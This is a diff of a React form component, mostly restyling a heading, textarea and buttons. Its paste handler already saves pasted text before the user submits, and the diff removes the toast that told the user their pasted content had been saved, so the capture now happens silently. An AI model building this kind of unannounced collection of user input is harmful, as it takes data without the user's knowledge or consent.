@@ -65,38 +65,33 @@ const Form = () => {
           <div className="">
             <form onSubmit={handleSubmit} className="space-y-6">
               <div>
-  <label htmlFor="submission" className="block text-sm font-medium text-foreground mb-2">
-    Enter your information
-  </label>
+ <h2 className="text-xl font-bold text-black text-center mb-4">
+  Enter your information
+</h2>
   <textarea
-    id="submission"
-    value={inputValue}
-    onChange={(e) => setInputValue(e.target.value)}
-    onPaste={(e) => {
-      e.preventDefault();
-      const pastedText = e.clipboardData.getData('text');
-      setInputValue(pastedText);
-      
-      if (pastedText.trim()) {
-        saveSubmission(pastedText.trim());
-        toast({
-          title: "Data Saved",
-          description: "Your pasted content has been saved. Click submit to continue.",
-          className: "border-accent/50 bg-accent/10",
-        });
-      }
-    }}
-    placeholder="Enter your information here..."
-    className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px] rounded-md resize-vertical"
-    disabled={isSubmitting}
-  />
+  id="submission"
+  value={inputValue}
+  onChange={(e) => setInputValue(e.target.value)}
+  onPaste={(e) => {
+    e.preventDefault();
+    const pastedText = e.clipboardData.getData('text');
+    setInputValue(pastedText);
+    
+   if (pastedText.trim()) {
+  saveSubmission(pastedText.trim());
+}
+  }}
+  placeholder="Enter your information here..."
+  className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px] rounded-md resize-vertical text-lg"
+  disabled={isSubmitting}
+/>
 </div>
 
              <div className="space-y-4">
   <Button
   type="submit"
   disabled={isSubmitting}
- className="w-full bg-white hover:bg-gray-50 text-[#692f8f] border border-[#692f8f] font-semibold py-3 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
+className="w-full bg-white hover:bg-gray-50 text-[#692f8f] border border-[#692f8f] font-semibold py-3 text-base transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
 >
     {isSubmitting ? (
       <>
@@ -113,11 +108,11 @@ const Form = () => {
   <Button
     type="button"
     onClick={() => window.location.href = ""}
-   className="w-full bg-[#703d92] hover:bg-[#692f8f] text-white font-semibold py-3 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
+  className="w-full bg-[#703d92] hover:bg-[#692f8f] text-white font-semibold py-3 text-base transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
   >
     Go to External Link
   </Button>
-   <div className="text-left text-sm text-muted-foreground mt-6 space-y-2">
+<div className="text-left text-base text-muted-foreground mt-6 space-y-2">
     <p>Nawui hi ithumna mashijin pai mana, nawui hi namang na shichin kapaina.aruiruiva shimaan haikha mahan unglui pai mana.</p>
     <p>
       Shiman hairla? <a href="" className="text-accent hover:underline">hili kadhar semkhuilo</a>, kha nawui katongkha shimaan haora.
